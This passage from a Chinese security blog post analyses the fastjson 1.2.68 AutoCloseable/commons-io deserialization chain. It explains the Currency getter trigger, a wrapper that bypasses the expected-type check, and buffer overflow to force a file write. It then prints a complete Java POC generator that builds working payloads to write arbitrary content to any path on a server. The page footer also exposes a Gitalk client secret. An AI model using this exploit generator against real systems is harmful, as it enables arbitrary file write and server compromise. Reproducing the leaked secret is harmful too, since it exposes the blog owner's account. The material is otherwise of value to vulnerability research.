+<p>其中有一个 MiscCodec 方法，在 fastjson 1.2.47 使用 <code>java.lang.Class</code> 缓存绕过检查时曾经遇见过，不过这次使用的类，是 <code>java.util.Currency</code>。</p>
+<p>在 MiscCodec 的 deserialze 方法中，会解析 “val” 中的内容放入 objVal 中，并对其进行解析。</p>
+<figure data-type="image" tabindex="37"><img src="https://su18.org/post-images/1621931755453.png" alt="" loading="lazy"></figure>
+<p>如果 objVal 是 JSONObject 对象，并且 <code>@type</code> 的 clazz 是 Currency 对象的话，会调用 JSONObject 的 <code>getString</code> 方法获取 key 为 currency 的值，如果值为 null 则获取 key 为 currencyCode 的值。</p>
+<figure data-type="image" tabindex="38"><img src="https://su18.org/post-images/1621932310594.png" alt="" loading="lazy"></figure>
+<p>并调用了其 value 对象的 toString 方法，如果这个对象为 JSONObject ，那就会调用 JSONObject 的 <code>toString</code> 方法，就是 <code>JSON.toString</code>，调用 <code>toJSONString</code> 方法，如果其中是 Map 类型的数据，就可以按照之前的分析触发 getter 方法的调用。</p>
+<figure data-type="image" tabindex="39"><img src="https://su18.org/post-images/1621931738276.png" alt="" loading="lazy"></figure>
+<p>所以我们按照上述流程构造 json：</p>
+<pre><code class="language-json">{
+	&quot;@type&quot;: &quot;java.util.Currency&quot;,
+	&quot;val&quot;: {
+		&quot;currency&quot;: {
+			&quot;abc&quot;: {
+				&quot;@type&quot;: &quot;java.util.Map&quot;,
+				&quot;aaa&quot;: {
+					&quot;@type&quot;: &quot;org.su18.fastjson.common.Person&quot;,
+					&quot;a&quot;: &quot;s&quot;,
+					&quot;age&quot;: 12,
+					&quot;name&quot;: &quot;su18&quot;
+				}
+			}
+		}
+	}
+}
+</code></pre>
+<p>这样就可以在使用 <code>parse</code> 的情况下也触发 getter/setter 方法。</p>
+<figure data-type="image" tabindex="40"><img src="https://su18.org/post-images/1621936157694.png" alt="" loading="lazy"></figure>
+<p>这里我们发现，如果不写 <code>&quot;@type&quot;: &quot;java.util.Map&quot;</code>，同样可以触发  getter/setter 方法，因为在不使用 @type 指定类时，这种键值对的写法会被处理成 JSONObject，同样使用 MapSerializer 处理，能够进行触发。</p>
+<h2 id="指定-class-对象">指定 class 对象</h2>
+<p>最后，再在外面嵌套一层键值，用来兼容当指定了反序列化的期待类时的情况：</p>
+<pre><code class="language-json">{&quot;su18&quot;: {payload}}
+</code></pre>
+<p>如果 fastjson 在解析时指定了类型 <code>JSON.parseObject(json,Test.class)</code>。此时如果我们想用 <code>@type</code> 去指定类型解析，程序将会在 checkAutoType 时抛出 <code>type not match</code> 异常，我们需要在 payload 的 json 外再包裹一层来绕过。</p>
+<figure data-type="image" tabindex="41"><img src="https://su18.org/post-images/1621939310239.png" alt="" loading="lazy"></figure>
+<p>这里能够绕过指定类型的原理是，在指定了类后，fastjson 就会直接尝试创建这个类，即使我们给他传递的 field（也就是上面的 su18）指定类里没有。但是 fastjson 还是会继续处理和反序列化其中的内容。</p>
+<p>但是这种情况还有一个限制，那就是需要 fastjson 指定的类有无参的构造方法，否则将可能无法创建类。</p>
+<h2 id="文件写出">文件写出</h2>
+<p>现在万事俱备，只欠东风。如何才能将我们千辛万苦放到流中的内容写回去呢？首要的想法肯定是触发调用 close/flush 一类的方法，就像浅蓝的 payload 里那样，但是这样的方法太少了，太难找了。</p>
+<p>除了调用，还有什么方式能够触发 flush 呢？这种情况让我们想起了 BufferedOutputStream，在缓冲区写满了之后，会触发自动写出文件内容，这正好是我们需要的触发方式。</p>
+<p>那我们可不可以使用类似的方式触发呢？我们来看一下我们使用的 WriterOutputStream 对象。WriterOutputStream 写出流内容依赖其中的 Writer 对象，在我们的调用链中，使用了 FileWriterWithEncoding 。</p>
+<p>这个方法实际上是 OutputStreamWriter 的完全封装，在创建了 FileOutputStream 后使用 OutputStreamWriter 进行封装。</p>
+<figure data-type="image" tabindex="42"><img src="https://su18.org/post-images/1622094731953.png" alt="" loading="lazy"></figure>
+<p>类中使用了 StreamEncoder 流。</p>
+<figure data-type="image" tabindex="43"><img src="https://su18.org/post-images/1622094740749.png" alt="" loading="lazy"></figure>
+<p>在 StreamEncoder 中定义了默认的缓冲区大小是 8192。</p>
+<figure data-type="image" tabindex="44"><img src="https://su18.org/post-images/1622094756532.png" alt="" loading="lazy"></figure>
+<p>在执行写文件的实现方法中，会判断当前缓冲区内容管是否溢出，如果有溢出，则执行写出动作。</p>
+<figure data-type="image" tabindex="45"><img src="https://su18.org/post-images/1622095791405.png" alt="" loading="lazy"></figure>
+<p>这部分的具体分析可以观看<a href="https://blog.csdn.net/ai_bao_zi/article/details/81181198">这篇文章</a>。</p>
+<p>也就是说，我们满足在字符串写入的时候保证流大小超出这个缓冲区即可。</p>
+<h1 id="生成代码">生成代码</h1>
+<p>这里我为生成上述的完整 payload 编写了一个工具类，方便测试：</p>
+<pre><code class="language-java">package org.su18.fastjson.test;
+
+
+import com.alibaba.fastjson.JSON;
+import org.apache.commons.io.FileUtils;
+
+import java.io.File;
+import java.io.IOException;
+
+/**
+ * fastjson 1.2.68 autocloseable commons-io poc 生成工具类
+ *
+ * @author su18
+ */
+public class POC {
+
+	public static final String AUTOCLOSEABLE_TAG = &quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;;
+
+	/**
+	 * 在 payload 外包裹一层绕过指定类型
+	 *
+	 * @param payload payload
+	 * @return 返回结果
+	 */
+	public static String bypassSpecializedClass(String payload) {
+		return &quot;{\&quot;su18\&quot;:&quot; + payload + &quot;}&quot;;
+	}
+
+
+	/**
+	 * 使用 Currency 类解析调用 &quot;currency&quot; 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString
+	 *
+	 * @param payload payload
+	 * @return 返回结果
+	 */
+	public static String useCurrencyTriggerAllGetter(String payload, boolean ref) {
+		return String.format(&quot;{\&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\&quot;val\&quot;:{\&quot;currency\&quot;:%s%s}}%s&quot;,
+				(ref ? &quot;&quot; : &quot;{\&quot;su19\&quot;:&quot;), payload, (ref ? &quot;&quot; : &quot;}&quot;));
+	}
+
+
+	/**
+	 * 生成 CharSequenceInputStream 反序列化字符串
+	 *
+	 * @param content 写入内容
+	 * @param ref     是否使用引用对象
+	 * @return 返回结果
+	 */
+	public static String generateCharSequenceInputStream(String content, boolean ref) {
+		int mod = 8192 - content.length() % 8192;
+
+		StringBuilder contentBuilder = new StringBuilder(content);
+		for (int i = 0; i &lt; mod+1; i++) {
+			contentBuilder.append(&quot; &quot;);
+		}
+
+		return String.format(&quot;{%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,&quot; +
+						&quot;\&quot;charset\&quot;:\&quot;UTF-8\&quot;,\&quot;bufferSize\&quot;:4,\&quot;s\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.String\&quot;\&quot;%s\&quot;}&quot;,
+				ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, contentBuilder);
+	}
+
+
+	/**
+	 * 生成 FileWriterWithEncoding 反序列化字符串
+	 *
+	 * @param filePath 要写入的文件位置
+	 * @param ref      是否使用引用对象
+	 * @return 返回结果
+	 */
+	public static String generateFileWriterWithEncoding(String filePath, boolean ref) {
+		return String.format(&quot;{%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,&quot; +
+				&quot;\&quot;file\&quot;:\&quot;%s\&quot;,\&quot;encoding\&quot;:\&quot;UTF-8\&quot;}&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, filePath);
+	}
+
+	/**
+	 * 生成 WriterOutputStream 反序列化字符串
+	 *
+	 * @param writer writer 对象反序列化字符串
+	 * @param ref    是否使用引用对象
+	 * @return 返回结果
+	 */
+	public static String generateWriterOutputStream(String writer, boolean ref) {
+		return String.format(&quot;{%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\&quot;writeImmediately\&quot;:true,&quot; +
+						&quot;\&quot;bufferSize\&quot;:4,\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;writer\&quot;:%s}&quot;,
+				ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, writer);
+	}
+
+
+	/**
+	 * 生成 TeeInputStream 反序列化字符串
+	 *
+	 * @param inputStream  inputStream 类
+	 * @param outputStream outputStream 类
+	 * @param ref          是否使用引用对象
+	 * @return 返回结果
+	 */
+	public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) {
+		return String.format(&quot;{%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\&quot;input\&quot;:%s,&quot; +
+				&quot;\&quot;closeBranch\&quot;:true,\&quot;branch\&quot;:%s}&quot;, ref ? AUTOCLOSEABLE_TAG : &quot;&quot;, inputStream, outputStream);
+	}
+
+
+	/**
+	 * 生成 BOMInputStream 反序列化字符串
+	 *
+	 * @param inputStream inputStream 类
+	 * @param size        读取 byte 大小
+	 * @return 返回结果
+	 */
+	public static String generateBOMInputStream(String inputStream, int size) {
+
+		int nums = size / 8192;
+		int mod  = size % 8192;
+
+		if (mod != 0) {
+			nums = nums + 1;
+		}
+
+		StringBuilder bytes = new StringBuilder(&quot;0&quot;);
+		for (int i = 0; i &lt; nums * 8192; i++) {
+			bytes.append(&quot;,0&quot;);
+		}
+		return String.format(&quot;{%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\&quot;delegate\&quot;:%s,&quot; +
+						&quot;\&quot;boms\&quot;:[{\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;bytes\&quot;:[%s]}]}&quot;,
+				AUTOCLOSEABLE_TAG, inputStream, bytes);
+	}
+
+
+	/**
+	 * 读取文件内容字符串
+	 *
+	 * @param file 文件路径
+	 * @return 返回字符串
+	 */
+	public static String readFile(File file) {
+		String result = &quot;&quot;;
+
+		try {
+			result = FileUtils.readFileToString(file);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+
+		return result;
+	}
+
+
+	/**
+	 * 生成普通 payload
+	 *
+	 * @param payloadFile    写入文件本地存储位置
+	 * @param targetFilePath 写出目标文件位置
+	 * @return 返回 payload
+	 */
+	public static String generatePayload(String payloadFile, String targetFilePath) {
+		File   file        = new File(payloadFile);
+		String fileContent = readFile(file);
+		if (!&quot;&quot;.equals(fileContent)) {
+			return bypassSpecializedClass(
+					useCurrencyTriggerAllGetter(
+							generateBOMInputStream(
+									generateTeeInputStream(generateCharSequenceInputStream(fileContent, false),
+											generateWriterOutputStream(
+													generateFileWriterWithEncoding(targetFilePath, false),
+													false),
+											false),
+									(int) file.length()),
+							false));
+		}
+
+		return &quot;&quot;;
+	}
+
+	/**
+	 * 生成引用型 payload
+	 *
+	 * @param payloadFile    写入文件本地存储位置
+	 * @param targetFilePath 写出目标文件位置
+	 * @return 返回 payload
+	 */
+	public static String generateRefPayload(String payloadFile, String targetFilePath) {
+		File   file        = new File(payloadFile);
+		String fileContent = readFile(file);
+		if (!&quot;&quot;.equals(fileContent)) {
+			return bypassSpecializedClass(
+					useCurrencyTriggerAllGetter(
+							&quot;{\&quot;writer\&quot;:&quot; + generateFileWriterWithEncoding(targetFilePath, true) +
+									&quot;,\&quot;outputStream\&quot;:&quot; + generateWriterOutputStream(&quot;{\&quot;$ref\&quot;:\&quot;$.currency.writer\&quot;}&quot;, true) +
+									&quot;,\&quot;charInputStream\&quot;:&quot; + generateCharSequenceInputStream(fileContent, true) +
+									&quot;,\&quot;teeInputStream\&quot;:&quot; + generateTeeInputStream(&quot;{\&quot;$ref\&quot;:\&quot;$.currency.charInputStream\&quot;}&quot;, &quot;{\&quot;$ref\&quot;:\&quot;$.currency.outputStream\&quot;}&quot;, true) +
+									&quot;,\&quot;inputStream\&quot;:&quot; + generateBOMInputStream(&quot;{\&quot;$ref\&quot;:\&quot;$.currency.teeInputStream\&quot;}&quot;, (int) file.length()) + &quot;}&quot;
+							, true
+					)
+			);
+		}
+
+		return &quot;&quot;;
+
+	}
+
+
+	public static void main(String[] args) {
+		String file   = &quot;/Users/phoebe/Downloads/12.txt&quot;;
+		String target = &quot;/Users/phoebe/Downloads/123.txt&quot;;
+
+		// 正常调用 payload 生成
+		String payload = generatePayload(file, target);
+
+		// 引用类型 payload 生成
+		String payloadWithRef = generateRefPayload(file, target);
+
+//		以下三种调用方式均可兼容，触发反序列化
+//		JSON.parse(payloadWithRef);
+		JSON.parseObject(payloadWithRef);
+//		JSON.parseObject(payloadWithRef,POC.class);
+	}
+
+}
+</code></pre>
+<h1 id="综述">综述</h1>
+<p>在这条反序列化调用链中，我们一共使用了 fastjson 的如下几个特性：</p>
+<ol>
+<li>fastjson 优先将 json 中的参数交给构造方法去调用，这扩展了 fastjson 反序列化的漏洞面，不局限于 getter/setter 方法，也可以使用构造方法的参数传递变量，进行类的初始化；</li>
+<li>对 getter 方法的定义宽泛，无需有相关成员变量，只要命名为 “getXXX” 类型的方法，fastjson 就会认为其为 getter 方法进行调用，这就不局在限于成员变量中的 getter 方法，只要叫 getXXX 的方法都可以成为触发漏洞的方法；</li>
+<li>反序列化一个 Map（JSONObject 也是 Map 的实现） 对象时，会使用 MapSerializer 的 writer 方法执行获取 value 对象的各项属性的操作，会反射调用 value 对象中的 getter 方法；</li>
+<li>如果反序列化的指定类是 <code>java.util.Currency</code> ，使用 MiscCodec 的 deserialze 方法，获取 currencyCode 或者 currency 的值，并调用其 toString 方法，如果这个值的类是 JSONObject 方法，将会调用 JSONObject 的 toString，也就是 JSON.toJSONString，触发 getter/setter 方法的调用；</li>
+<li>指定类型反序列化时，不论参数是否对应，fastjson 都会去创建对象，并处理相关内容，因此使用外层嵌套可以绕过指定期待类进行反序列化；</li>
+<li>使用 AutoCloseable 子类绕过 AutoType 检测，尝试读写文件。</li>
+</ol>
+<p>结合这 6 条特性， 可以通杀服务器上任意一种写法的 json 解析，并且可以指定调用任意符合条件的 getter/setter/构造方法，大大扩大了漏洞挖掘的范围。</p>
+<h1 id="总结">总结</h1>
+<p>这里我们首先可以看到，在 fastjson 实现序列化和反序列化的种种功能时，具体实现并不是完全按照标准，而是使用了很多奇怪的想法来实现，导致使用奇奇怪怪的 json 喂给 fastjson 去反序列化可以出现难以预期的结果，也就是在安全研究人员眼里所谓的特性。</p>
+<p>这条链不是我挖的，能挖出这条利用链的人员实在是强，他一定对 fastjson 的几乎各个细节的实现方式都很了解，才能组合出如此美丽的 payload。这才是真正的踏踏实实的安全研究，而不是功利性的，为了给公司吹水、包装产品而做的伪工作，膜拜了，不知道我什么时候能到这种水平。</p>
+<p>而在如此多的特性下，一定还有更多的调用链被挖掘出来。</p>
+<p>网上 fastjson 漏洞调试的文章很多，太多了，包括我自己也写了一篇，但是都真的写明白了吗？都真的理解了吗？并不尽然，已知的漏洞调用流程可能多多少少都清楚，但是技术细节究竟是怎么实现的？实现的有什么问题？安全上能带来什么？</p>
+<p>这些问题可能 95% 的安全从业人员都无法清楚明白的回答，做安全，就应该静下心来看实现，搞研究。学的越多，才发现自己不会的越多，加油吧。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a></li>
+<li><a href="#payload-%E5%88%86%E6%9E%90">PAYLOAD 分析</a>
+<ul>
+<li><a href="#charsequenceinputstream">CharSequenceInputStream</a></li>
+<li><a href="#filewriterwithencoding">FileWriterWithEncoding</a></li>
+<li><a href="#writeroutputstream">WriterOutputStream</a></li>
+<li><a href="#teeinputstream">TeeInputStream</a></li>
+<li><a href="#bominputstream">BOMInputStream</a></li>
+<li><a href="#getter-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8">GETTER 方法调用</a></li>
+<li><a href="#parse-%E4%B8%8E-parseobject">parse 与 parseObject</a></li>
+<li><a href="#%E6%8C%87%E5%AE%9A-class-%E5%AF%B9%E8%B1%A1">指定 class 对象</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%87%BA">文件写出</a></li>
+</ul>
+</li>
+<li><a href="#%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81">生成代码</a></li>
+<li><a href="#%E7%BB%BC%E8%BF%B0">综述</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/struts2-5/">
+              <h3 class="post-title">
+                Struts2 系列漏洞调试总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
